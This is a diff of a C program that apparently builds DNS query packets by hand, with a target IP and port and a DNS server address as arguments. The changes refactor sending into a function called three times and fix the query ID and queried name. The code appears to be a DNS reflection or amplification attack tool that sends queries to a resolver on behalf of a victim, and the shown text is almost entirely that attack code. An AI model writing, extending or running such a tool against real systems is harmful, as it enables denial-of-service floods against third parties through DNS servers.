@@ -16,16 +16,15 @@
 typedef struct iphdr iphdr;
 typedef struct udphdr udphdr;
 
-/* change url to specific form */
+void dns_send(char *, int, char *, int);
 void dns_format(unsigned char *, unsigned char *);
-
-/* calculate checksum */
 unsigned short csum(unsigned short *, int);
 
-/* DNS header struct */
+// DNS header struct
 typedef struct
 {
-	unsigned short id;
+	unsigned short id; 		// ID
+	// unsigned short flags;	// DNS Flags
     unsigned char rd : 1;
     unsigned char tc : 1;
     unsigned char aa : 1;
@@ -36,13 +35,13 @@ typedef struct
     unsigned char ad : 1;
     unsigned char z : 1;
     unsigned char ra : 1;
-	unsigned short qcount;
-	unsigned short ans;
-	unsigned short auth;
-	unsigned short add;
+	unsigned short qcount;	// Question Count
+	unsigned short ans;		// Answer Count
+	unsigned short auth;	// Authority RR
+	unsigned short add;		// Additional RR
 }dnshdr;
 
-/* Question types */
+// Question types
 typedef struct
 {
 	unsigned short qtype;
@@ -57,7 +56,13 @@ int main(int argc, char **argv){
     }
     char *target_ip = argv[1], *dns_ip = argv[3];
     int target_port = atoi(argv[2]), dns_port = 53;
-    
+    int i=0;
+    for(i=0; i<3; i++){
+        dns_send(target_ip, target_port, dns_ip, 53);
+    }
+}
+   
+void dns_send(char *target_ip, int target_port, char *dns_ip, int dns_port){ 
     /* create socket */
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
@@ -73,7 +78,8 @@ int main(int argc, char **argv){
     unsigned char dns_data[128]; // dns data(header + content)
     // dns
     dnshdr *dns = (dnshdr *)&dns_data;
-    dns->id = (unsigned short) htons(getpid());
+    dns->id = (unsigned short) htons(0x6652);
+    //dns->flags = htons(0x0100);
     dns->qr = 0;
     dns->opcode = 0;
     dns->aa = 0;
@@ -91,7 +97,7 @@ int main(int argc, char **argv){
 
     unsigned char *dns_name, url[32];
     dns_name = (unsigned char *)&dns_data[sizeof(dnshdr)];
-    strcpy(url, URL3);
+    strcpy(url, URL2);
     dns_format(dns_name, url);
 
     query *q = (query *)&dns_data[sizeof(dnshdr) + strlen(dns_name) + 1];
@@ -123,7 +129,7 @@ int main(int argc, char **argv){
     if(sd != -1) sendto(sd, packet, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
     else printf("Could not create socket");
     close(sd);
-    return 0;
+    return;
 }
 
 void dns_format(unsigned char * dns,unsigned char * host) {
